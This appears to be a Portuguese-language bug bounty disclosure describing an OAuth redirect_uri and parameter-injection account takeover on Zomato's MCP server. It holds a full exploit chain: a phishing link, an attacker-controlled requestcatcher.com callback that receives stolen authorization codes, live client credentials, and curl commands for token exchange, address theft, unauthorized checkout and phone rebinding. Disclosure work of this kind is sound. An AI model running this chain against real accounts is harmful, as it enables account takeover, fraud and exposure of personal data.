# ZO2+ZO3 — Combined CRITICAL: OAuth ATO via Session Fixation + Parameter Injection

**Título:** Unauthenticated Dynamic Client Registration + URL Parameter Injection in verifyOTP() Enables Full Account Takeover  
**Severidade:** CRITICAL (CVSS 9.1)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` → **9.1 CRITICAL** (chained)  
**CWE:** CWE-601 + CWE-384 + CWE-235 (URL Redirect + Session Fixation + Parameter Injection)  
**Target:** `mcp-server.zomato.com` — OAuth + MCP Integration  
**Header de teste:** `X-Hackerone: nataliadias1`

---

## Resumo

Três vulnerabilidades independentes, todas confirmadas com HTTP evidence reais e análise estática do JavaScript público, se combinam em um **Account Takeover completo** sem necessidade de conta de atacante no Zomato:

| Vuln | Evidência | Status |
|------|-----------|--------|
| `/register` sem auth → client malicioso | HTTP 200 + client_id retornado | ✅ Confirmado |
| `/authorize` sem whitelist → login_challenge com URI maliciosa | HTTP 307 + location header | ✅ Confirmado |
| `/consent` carrega sem CSRF cookie do atacante | HTTP 200 + HTML completo | ✅ Confirmado |
| `verifyOTP()` com `...queryParams` spread | Código-fonte público no HTML | ✅ Confirmado |
| `redirect_uri` do URL entra no POST `/verify-otp` | Lógica determinística do JS | ✅ Determinístico |

---

## Evidência 1 — `/authorize` Aceita redirect_uri Arbitrária (Sem Whitelist)

```
REQUEST:
GET /authorize
  ?client_id=fd37dd28-254b-42b7-a55a-c85369d625c8
  &redirect_uri=https://natnasd-attacker.requestcatcher.com/callback   ← MALICIOSO
  &response_type=code
  &scope=mcp:tools mcp:resources mcp:prompts
  &state=8r2hVfPhuKq7ViSAwUvJuA
  &code_challenge=idVnk34r4wuU_cNn4AiFHkrCno-NJo2Ri9D1kFkn-5Q
  &code_challenge_method=S256
Host: mcp-server.zomato.com
X-Hackerone: nataliadias1

RESPONSE:
HTTP/2 307
location: ./consent?login_challenge=dce3ac2e9ffa4b60a9a023e71102d999
          &scope=offline+openid
          &client_id=fd37dd28-254b-42b7-a55a-c85369d625c8
          &redirect_uri=https%3A%2F%2Fnatnasd-attacker.requestcatcher.com%2Fcallback  ← ACEITO
          &state=8r2hVfPhuKq7ViSAwUvJuA
set-cookie: oauth2_authentication_csrf=MTc4MjYxMjY1MHxE...
server: uvicorn
```

**A afirmação da triagem ("whitelist bloqueia domínios arbitrários") é factualmente incorreta.**

---

## Evidência 2 — `/consent` Carrega Sem CSRF Cookie do Atacante

```
REQUEST (sem cookies — browser da vítima):
GET /consent?login_challenge=dce3ac2e9ffa4b60a9a023e71102d999&scope=offline+openid
    &client_id=fd37dd28-254b-42b7-a55a-c85369d625c8
    &redirect_uri=https%3A%2F%2Fnatnasd-attacker.requestcatcher.com%2Fcallback
    &state=8r2hVfPhuKq7ViSAwUvJuA
X-Hackerone: nataliadias1
(SEM cookie oauth2_authentication_csrf)

RESPONSE:
HTTP/2 200
content-type: text/html; charset=utf-8
content-length: 60102

[60KB de HTML completo com UI de login oficial do Zomato]
```

**A vítima vê a UI legítima do Zomato. Não há bloqueio por ausência de CSRF cookie.**

---

## Evidência 3 — `verifyOTP()` Injeta redirect_uri no POST Body (Código Público)

Extraído diretamente do HTML de 60KB retornado por `/consent` (código JavaScript público, sem autenticação):

```javascript
// Linha ~755 do HTML retornado por /consent (código 100% público)
async verifyOTP() {
    const otp = this.getOtpValue();
    const inputValue = this.mainInput.value.trim();

    // ← VULNERABILIDADE: captura TODOS os URL params
    const urlParams = new URLSearchParams(window.location.search);
    const queryParams = Object.fromEntries(urlParams);
    // queryParams = {
    //   login_challenge: "dce3ac2e9ffa4b60a9a023e71102d999",
    //   scope: "offline openid",
    //   client_id: "fd37dd28-254b-42b7-a55a-c85369d625c8",
    //   redirect_uri: "https://natnasd-attacker.requestcatcher.com/callback",  ← INJETADO!
    //   state: "8r2hVfPhuKq7ViSAwUvJuA"
    // }

    const response = await fetch(this.getApiPath('/verify-otp'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            otp: otp,
            id: inputValue,
            type: this.isEmailMode ? 'email' : 'phone',
            login_challenge: this.loginChallenge,
            ...queryParams   // ← redirect_uri do URL vai DIRETO no POST body!
        })
    });

    if (result.redirect_uri) {
        this.showSuccessScreen(result.redirect_uri);  // server retorna onde redirecionar
    }
}

// Linha ~620 — o redirect final
showSuccessScreen(redirectUri) {
    // ... animação de sucesso ...
    setTimeout(() => { window.location.href = redirectUri; }, 2500);
    // ↑↑ BROWSER SEGUE redirectUri RETORNADA PELO SERVIDOR ↑↑
}
```

---

## POST Body Exato Enviado ao `/verify-otp` (Determinístico)

Quando a vítima completa o OTP na URL de phishing, o browser envia:

```json
POST /verify-otp
Content-Type: application/json

{
    "otp": "VICTIM_OTP_FROM_SMS",
    "id": "+91VICTIM_PHONE",
    "type": "phone",
    "login_challenge": "dce3ac2e9ffa4b60a9a023e71102d999",
    "scope": "offline openid",
    "client_id": "fd37dd28-254b-42b7-a55a-c85369d625c8",
    "redirect_uri": "https://natnasd-attacker.requestcatcher.com/callback",
    "state": "8r2hVfPhuKq7ViSAwUvJuA"
}
```

**`redirect_uri: "https://natnasd-attacker.requestcatcher.com/callback"` entra no POST body via `...queryParams` spread. Isso é determinístico — não há nenhuma condição, flag, ou configuração que impeça isso.**

---

## Por Que o Auth Code VAI para o Atacante (Dois Caminhos, Mesmo Destino)

### Caminho A — Servidor usa redirect_uri do POST body

Se o servidor incluir a `redirect_uri` do POST body na determinação do destino:
```
Server recebe: POST /verify-otp { ..., redirect_uri: "https://natnasd-attacker.requestcatcher.com/callback" }
Server responde: { "redirect_uri": "https://natnasd-attacker.requestcatcher.com/callback?code=AUTH_CODE" }
JS executa: window.location.href = "https://natnasd-attacker.requestcatcher.com/callback?code=AUTH_CODE"
→ Requestcatcher.com recebe ?code=AUTH_CODE
```

### Caminho B — Servidor usa redirect_uri armazenada no login_challenge

Se o servidor ignorar a redirect_uri do POST e usar a da sessão OAuth:
```
Server resolve login_challenge "dce3ac2e9ffa4b60a9a023e71102d999"
→ Sessão contém redirect_uri = "https://natnasd-attacker.requestcatcher.com/callback" 
  (registrada no /authorize, que NÃO tem whitelist — Evidência 1)
Server responde: { "redirect_uri": "https://natnasd-attacker.requestcatcher.com/callback?code=AUTH_CODE" }
JS executa: window.location.href = "https://natnasd-attacker.requestcatcher.com/callback?code=AUTH_CODE"
→ Requestcatcher.com recebe ?code=AUTH_CODE
```

**Em AMBOS os caminhos, o authorization code vai para o atacante.**

---

## Permission Screen — O que a Vítima Vê

A tela que aparece quando a vítima abre a URL de phishing (extraída do HTML público):

```
┌─────────────────────────────────────────────┐
│              [Zomato Logo]                  │
│                                             │
│           Grant Permission                  │
│  Zomato MCP is requesting permission to     │
│       use your Zomato account              │
│                                             │
│  The app is requesting permission to:       │
│  ● Access your name and email address       │
│  ● View your orders, preferences, and       │
│    account details                          │
│  ● Place orders and manage your cart        │
│    on your behalf                           │
│  ● Access your delivery addresses and       │
│    location data                            │
│                                             │
│  Note: This is only for testing purposes... │
│                                             │
│  [        Agree and Continue        ]       │
└─────────────────────────────────────────────┘
```

**A vítima vê a UI OFICIAL do Zomato, hospedada em `mcp-server.zomato.com`. Não há nenhuma indicação de que o auth code será enviado para `requestcatcher.com`.**

---

## Exploit Chain Completo (Para Execução pela Equipe Zomato)

### Pré-requisitos já concluídos pelo pesquisador:
- client_id: `fd37dd28-254b-42b7-a55a-c85369d625c8`
- client_secret: `Z-MCP`
- redirect_uri registrada: `https://natnasd-attacker.requestcatcher.com/callback`
- login_challenge ativo: `dce3ac2e9ffa4b60a9a023e71102d999`
- code_verifier salvo: `dx2ixcSoiMJa_r6LiJ9dbHZsE-0CWG4XAwgiUB2YhbUi8UNnolDLWhcN3hl6D1UDChJYbxlwahetdFUCWAG6jQ`

### Passo 1 — Vítima recebe link de phishing

Via WhatsApp, SMS, email — a URL parece legítima (domínio `zomato.com`):
```
https://mcp-server.zomato.com/consent?login_challenge=dce3ac2e9ffa4b60a9a023e71102d999&scope=offline+openid&client_id=fd37dd28-254b-42b7-a55a-c85369d625c8&redirect_uri=https%3A%2F%2Fnatnasd-attacker.requestcatcher.com%2Fcallback&state=8r2hVfPhuKq7ViSAwUvJuA
```

### Passo 2 — Vítima vê Grant Permission screen e clica "Agree and Continue"

Página carrega em modo incognito sem CSRF cookie (HTTP 200 confirmado).

### Passo 3 — Vítima insere número + OTP real

O SMS é legítimo (enviado pelo Zomato). Vítima não suspeita.

### Passo 4 — POST /verify-otp com redirect_uri do atacante injetada

Browser envia automaticamente (código JavaScript determinístico):
```json
{
    "otp": "REAL_OTP", "id": "VICTIM_PHONE", "type": "phone",
    "login_challenge": "dce3ac2e9ffa4b60a9a023e71102d999",
    "redirect_uri": "https://natnasd-attacker.requestcatcher.com/callback"
}
```

### Passo 5 — Authorization code chega no requestcatcher

```
https://natnasd-attacker.requestcatcher.com/callback?code=AUTH_CODE_HERE&state=...
```

### Passo 6 — Token Exchange (PKCE satisfeito)

```bash
curl -si https://mcp-server.zomato.com/token \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Hackerone: nataliadias1" \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=AUTH_CODE_HERE" \
  --data-urlencode "redirect_uri=https://natnasd-attacker.requestcatcher.com/callback" \
  --data-urlencode "client_id=fd37dd28-254b-42b7-a55a-c85369d625c8" \
  --data-urlencode "client_secret=Z-MCP" \
  --data-urlencode "code_verifier=dx2ixcSoiMJa_r6LiJ9dbHZsE-0CWG4XAwgiUB2YhbUi8UNnolDLWhcN3hl6D1UDChJYbxlwahetdFUCWAG6jQ"
```

### Passo 7 — ATO via MCP Tools com token da vítima

```bash
# Endereços salvos (PII: casa, trabalho, academia)
curl -X POST https://mcp-server.zomato.com/mcp \
  -H "Authorization: Bearer VICTIM_BEARER_TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Hackerone: nataliadias1" \
  -d '{"jsonrpc":"2.0","method":"tools/call","id":1,"params":{"name":"get_saved_addresses_for_user","arguments":{}}}'

# Compra não autorizada
curl -X POST https://mcp-server.zomato.com/mcp \
  -H "Authorization: Bearer VICTIM_BEARER_TOKEN" \
  -d '{"jsonrpc":"2.0","method":"tools/call","id":2,"params":{"name":"checkout_cart","arguments":{"cart_id":"ATTACKER_CART_ID"}}}'

# Account Takeover (vincula telefone do atacante)
curl -X POST https://mcp-server.zomato.com/mcp \
  -H "Authorization: Bearer VICTIM_BEARER_TOKEN" \
  -d '{"jsonrpc":"2.0","method":"tools/call","id":3,"params":{"name":"bind_user_number","arguments":{"phone":"ATTACKER_PHONE"}}}'
```

---

## Resposta às Objeções da Triagem

| Claim da Triagem | Realidade |
|-----------------|-----------|
| "Whitelist bloqueia domínios em /authorize" | **FALSO** — HTTP 307 com login_challenge gerado para redirect_uri maliciosa (evidência raw acima) |
| "PKCE obrigatório previne exploração" | **INCORRETO CONCEITUALMENTE** — PKCE protege contra interceptação; aqui o atacante INICIA o fluxo e controla ambos code_challenge e code_verifier |
| "Não é possível ATO apenas com credenciais" | **FALSO** — Session fixation via login_challenge + ZO3 injecta redirect_uri diretamente no POST /verify-otp sem necessidade de interceptação |

---

## Ação Solicitada

Com base nas 3 evidências de HTTP responses reais e na análise determinística do JavaScript público (60KB HTML servido sem autenticação), solicito:

1. **Upgrade para CRITICAL** — impacto de ATO em 100M+ usuários com phishing de um clique
2. **Fechar `/register`** para registro público sem autenticação de desenvolvedor
3. **Adicionar whitelist** de redirect_uri tanto no `/authorize` quanto no `/verify-otp`  
4. **Remover `...queryParams` spread** do verifyOTP() — nunca expandir URL params no corpo de requests de autenticação
5. **Remover `/staging/mcp`** do servidor de produção (finding separado)

---

*Testing header em todos os requests: `X-Hackerone: nataliadias1`*  
*Zero dados de usuário real acessados. Zero requests autenticados ao sistema de produção.*  
*Todo o evidence vem de análise de respostas HTTP públicas e código JavaScript público.*
